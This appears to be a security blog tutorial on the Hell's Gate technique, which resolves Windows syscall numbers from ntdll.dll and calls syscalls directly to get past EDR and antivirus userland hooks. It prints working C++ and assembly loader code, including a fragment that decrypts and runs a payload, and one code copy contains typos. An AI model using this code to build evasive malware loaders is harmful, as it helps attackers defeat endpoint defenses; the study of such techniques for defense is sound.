---
layout: post
title: Hell's Gate
subtitle: There's lots to learn!
tags: [CyberSec]
comments: true
---

## What is Hell's Gate ?

Employing direct syscalls serves as a method to bypass userland hooks by manually executing the assembly instructions of a syscall. Hell's Gate, on the other hand, is an alternative technique utilized for the execution of direct syscalls. By parsing _ntdll.dll_, Hell's Gate can dynamically locate syscalls and subsequently execute them directly from the binary.

## The Approach of Hell's Gate

Hell's Gate use a different approach to find the System Service Number (SSN). Indeed, Hell's Gate approach works by searching for the SSN from within the hooked syscall's opcodes which are then called in its assembly functions.

## Syscall Structure

When using Hell's Gate, we have to first declare a *_VX_TABLE_ENTRY* structure, this structure represents a syscall and contains the address, the hash value of the syscall name and the SSN.

```c++
typedef struct _VX_TABLE_ENTRY {
	PVOID pAddress; // The address of a syscall function
	DWORD64 dwHash; // The hash value of the syscall name
	WORD wSystemCall; // The SSN of the syscall
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
```

This structure is itself a member of a larger structure named *_VX_TABLE*.

```c++
typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;
```

## 0x1 - Main function

The main function starts by calling the `RtlGetThreadEnvironmentBlock` function that is used to get the **Thread Environment Block** (TEB - It's storing information about the currently running thread). This is required to retrieve ntdll.dll's base address via the PEB (recall the PEB is located within the TEB). After that, we need to find the address of *ntdll.dll*. So, we utilize `ProcessEnvironmentBlock` which holds the pointer to doubled linked list (`InMemoryOrderModuleList`), which holds all loaded modules of the process. 

![Alt text](https://rfc6592.github.io/assets/img/processenvblockhellsgate.png)


Next, the export directory of *ntdll.dll* is fetched using `GetImageExportDirectory`. The export directory is found by parsing the *DOS* and *Nt* headers.

![Alt text](https://rfc6592.github.io/assets/img/eatofntdllhellsgate.png)
![Alt text](https://rfc6592.github.io/assets/img/imageexportdirectoryhellsgate.png)

Next, for each syscall the *dwHash member is initialized* (e.g **NtAllocateVirtualMemory.dwHash**) with its corresponding hash value. With each initialization, the *GetVxTableEntry* function is called.

## 0x2 - GetVxTableEntry function

#### TL;DR
*GetVxTableEntry* function will go through the Export Address Table (EAT) in this loop and then will try to find if there's a match of a function name hash matching our hash we are looking for.

![Alt text](https://rfc6592.github.io/assets/img/vxtableentryhellsgate.png)
![Alt text](https://rfc6592.github.io/assets/img/djb2hellsgate.png)

---
---

#### Overview - GetVxTableEntry

```c++
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}
```

Calculates the actual memory address of the table of function addresses in the module. 

```c++
PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
```

`pImageExportDirectory->AddressOfNames` is an offset value pointing to the table of function names in the export directory.

```c++
PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
```

`pwAddressOfNameOrdinales` a pointer to the beginning of the table of function name ordinals in the module.

```c++
PDWORD pwAddressOfNameOrdinales = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
```

#### Step 0x1 in GetVxTableEntry
The function searches for a *Djb2* hash value equal to the **syscall's hash**, `pxVxTableEntry->dwHash`. 

![Alt text](https://rfc6592.github.io/assets/img/functiondjb2hellsgate.png)

![Alt text](https://rfc6592.github.io/assets/img/vxtablentallocatehellsgate.png)

![Alt text](https://rfc6592.github.io/assets/img/vxtableentryfieldshellsgate.png)

Once there is a match then the address of the syscall will be saved to `pVxTableEntry->pAddress`. The second part of the function is where the Hell's Gate trick resides. 


```c++
// Quick and dirty fix in case the function has been hooked
WORD cw = 0;
while(TRUE) {
	// Check if syscall, in this case we are too far
	if (* ((PBYE)pFunctionAddress + cw) == 0x0f && * ((PBYTE)pFunctionAddress+cw+1) == 0x05;
		return false;
	// Check if ret, in this case we are too far
	if *((PBYTE)pFunctionAddress + cw) == 0xc3)
		return false
	// First opcodes should be :
	// MOV R10, RCX
	// MOV RCX, <SYSCALL>
	if ( *((PBYTE)pFunctionAddress + cw) == 0x4c 
						&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
		BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
		BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
		pVxTableEntry->wSystemCall = (high << 8) | low;
		break;
	
}

cw++;

};

```

#### Step 0x2 of GetVxTableEntry

The second part begins with a _while loop_ after finding the syscall address, `pFunctionAddress`. The while loop searches for the `0x4c, 0x8b, 0xd1, 0xb8` bytes which are opcodes for the `mov r10, rcx` and `mov rcx, ssn`, being the start of an unhooked syscall.

In this case where the syscall is hooked, the opcodes may not match due to the hook being added by security solutions prior to the `syscall` instruction. To address this, Hell's Gate attempts to match the opcodes, and if not match is found, the `cw` variable is incremented, which adds to the address of the syscall on the subsequent loop iteration. 

This progression continues, moving down one byte at a time until the `mov r10, rcx` and `mov rcx, ssn` instructions are reached.


If we have found all this bytes. It means that we are in a *Syscall stub*. So we can get the last two bytes and store them in our structure.

![Alt text](https://rfc6592.github.io/assets/img/syscallstubhellsgate.png)

Lastly, an overview of few things we used.

![Alt text](https://rfc6592.github.io/assets/img/fewitemshellsgate.png)

## 0x3 - Boundary Check 

To prevent itself from searching too far and obtaining a different SSN for a different syscall, two if-statements are made at the beginning of the while loop to check for the `syscall` and `ret` instructions located at the end of the syscall. 

If the searches reaches one of these instructions and the `0x4c, 0x8b, 0xd1, 0xb8` opcodes have not been identified, resolving the SSN will fail.

```c++
// Check if syscall, in this case we are too far
if (* ((PBYTE)pFunctionAddress + cw) == 0x0f && * ((PBYTE)pFunctionAddress + cw + 1) == 0x05) { return FALSE; }


// Check if ret, in this case we ara also probably too far
if ( *((PBYTE)pFunctionAddress + cw) == 0xc3) { return FALSE; }
```


## 0x4 - Calculating & Saving the SSN

On the other hand, if there is a successful match for the opcodes, Hell's Gate will calculate the syscall number and save it to `pVxTableEntry->wSystemCall`.

The function first uses the left shift operator (`<<`) to shift the bits of the high variable to the left by 8 times. It then uses the bitwise OR operator (`|`) to compare each bit of the first operand (being `high << 8`) to the corresponding bit of the second operand (being `low`).

#### 0x4.1 - Bitwise - Shift left / Shift right

`<< 1` : will double by 2^n, 'n' is 1
`>> 1` : will divide by 2^n, 'n' is 1
![Alt text](https://rfc6592.github.io/assets/img/Pasted image 20231212220757.png)
_e.g_ : 5x16 => 5 << 4;

#### 0x4.2 - Bitwise - AND (&)

- Check the state of a bit
	- 1011 0010
	- 0001 0000
	- ---------- &
	- 0001 0000 = 16
- Clear/Select a group of bits
	- 10110 0101  
	- 00000 1111  (0xF)
	- ----------- &
	- 00000 0101  


#### 0x4.3 - Bitwise - OR (|)

* Add bits or take away bits
* To get : 00000 0101, value :
	* int a = 101
	* int b = 10110
	* b << = 4;
	* int c = a | b
* 00000 0101
* 10110 0000
* ----------- |
* 10110 0101


To better understand this, the following is an example using `NtProtectVirtualMemory` syscall to demonstrate the Hell's Gate approach in calculating the SSN.

```c++
pVxTableEntry->wSystemCall = (high << 8) | low
```
![Alt text](https://rfc6592.github.io/assets/img/pvxtableentryhellsgate.png)

```
00007FFCC42C4570 | 4C:8BD1     | mov r10, rcx        |
00007FFCC42C4573 | B8 50000000 | mov eax, 50         | 50:'P'
00007FFCC42C4582 | 0F05        | syscall             |
00007FFCC42C4584 | C3          | ret                 |
```

The `4C:8BD1 B8 50000000` bytes correspond to the following offsets:

`4C` is offset 0, `8B` is offset 1 and `D1` is offset 2, `B8` is offset 3, `50` is offset 4, `00` is offset 5 and so on. The `GetVxTableEntry` function, specifies that the `high` and `low` variables have an offset of 5 and 4, respectively.

```c++
BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); // Offset 5 
BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); // Offset 4
```

Checking the value at offset 5 reveals that it is `0x00`, while the offset at 4 is `0x50`. This means that the value of `high` is `0x00` and `low` is `0x50`. Therefore, the SSN is equal to `(0x00 << 8) | 0x50`

The result of the bitwise operation matches the SSN number of `NtProtectVirtualMemory`, which is 50 in hex.

![Alt text](https://rfc6592.github.io/assets/img/ntprotectvirtualmemoryhellsgate.png)


## 0x5 - Calling the Syscall

Now that Hell's Gate has fully initialized the `VX_TABLE_ENTRY` structure of the target syscall, it can now call it. To do this, Hell's Gate uses two 64-bit assembly functions: `HellsGate` and `HellDescent`, shown in the *hellsgate.asm* file.

```
data 
	wSystemCall DWORD 000h  ; this is a global variable used to keep the SSN of a syscall

.code
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx  ; updating the 'wSystemCall' variable with input argument ecx
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall ; 'wSystemCall' is the SSN of the syscall to call
		syscall
		ret
	HellDescent ENDP
end
```


To invoke a syscall using the `HellsGate` function, the initial step involves passing the syscall number, which is then stored in the `wSystemCall` global variable for subsequent use. Following this, the `HellDescent` function is utilized to execute the syscall, with the necessary parameters being passed.

In the final segment of the code, a new thread is initiated, executing our decrypted payload within our process.

```c++
...

	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	
	...
	// We are going to wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, &Timeout);

	return TRUE;
```


![Alt text](https://rfc6592.github.io/assets/img/hellsgatevid.gif)

In summary, while HellsGate performs effectively, it encounters a limitation in its inability to handle _ntdll.dll_ that has already been hooked by security solutions such as AVs and EDRs running on the system.

---

## 0x6 - Sources

* https://institute.sektor7.net/rto-maldev-intermediate
* https://institute.sektor7.net/rto-win-evasion
* https://hadess.io/blog/
* https://maldevacademy.com/
